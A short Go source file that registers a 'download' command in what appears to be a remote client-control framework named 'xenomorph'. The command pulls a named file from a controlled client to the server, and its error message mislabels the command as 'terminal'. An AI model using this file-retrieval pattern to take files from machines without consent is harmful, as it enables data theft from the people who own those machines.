package command

import (
	"github.com/codevault-llc/xenomorph/pkg/logger"
	"github.com/codevault-llc/xenomorph/pkg/server"
	"github.com/codevault-llc/xenomorph/pkg/types"
	"go.uber.org/zap"
)

func initDownloadCommand() {
	err := commandHandler.AddCommand("download", func(client types.ClientController, msgID uint32, command types.Command) {
		filePath := command.Args[0]
		server.UploadFile(filePath, msgID, client)
	})

	if err != nil {
		logger.L().Error("Failed to register 'terminal' command handler", zap.Error(err))
	}
}
